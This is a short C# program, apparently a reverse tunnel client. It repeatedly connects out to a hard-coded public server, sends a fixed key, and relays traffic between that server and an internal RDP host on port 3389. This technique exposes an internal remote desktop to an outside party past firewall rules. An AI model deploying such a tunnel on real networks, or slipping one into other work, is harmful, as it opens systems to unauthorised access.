using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

class SimplifiedTcpClient
{
    private const string ServerIp = "167.71.227.50";
    private const int ServerPort = 5900;
    private const string RdpIp = "10.0.0.102";
    private const int RdpPort = 3389;

    static async Task Main(string[] args)
    {
        while (true)
        {
            try
            {
                await ConnectAndForwardAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                await Task.Delay(2000); // Wait before retrying
            }
        }
    }

    static async Task ConnectAndForwardAsync()
    {
        using (TcpClient serverClient = new TcpClient())
        using (TcpClient rdpClient = new TcpClient())
        {
            Console.WriteLine($"Connecting to server at {ServerIp}:{ServerPort}...");
            await serverClient.ConnectAsync(ServerIp, ServerPort);

            using (NetworkStream serverStream = serverClient.GetStream())
            {
                // Send the key
                byte[] key = new byte[] { 0, 8, 0, 0, 0, 34, 77, 0, 0, 0 };
                await serverStream.WriteAsync(key, 0, key.Length);

                // Receive the IP address (16 bytes)
                byte[] ipBytes = new byte[16];
                await serverStream.ReadAsync(ipBytes, 0, ipBytes.Length);

                Console.WriteLine("Connected to server and key verified.");

                Console.WriteLine($"Connecting to RDP at {RdpIp}:{RdpPort}...");
                await rdpClient.ConnectAsync(RdpIp, RdpPort);
                Console.WriteLine("Connected to RDP server.");

                using (NetworkStream rdpStream = rdpClient.GetStream())
                {
                    Console.WriteLine("Forwarding traffic...");
                    Task serverToRdp = ForwardTrafficAsync(serverStream, rdpStream, "Server -> RDP");
                    Task rdpToServer = ForwardTrafficAsync(rdpStream, serverStream, "RDP -> Server");

                    await Task.WhenAny(serverToRdp, rdpToServer);
                }
            }
        }
    }

    static async Task ForwardTrafficAsync(NetworkStream source, NetworkStream destination, string direction)
    {
        byte[] buffer = new byte[8192];
        try
        {
            int bytesRead;
            while ((bytesRead = await source.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                await destination.WriteAsync(buffer, 0, bytesRead);
                await destination.FlushAsync();
                Console.WriteLine($"{direction}: Forwarded {bytesRead} bytes");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error in {direction}: {ex.Message}");
        }
    }
}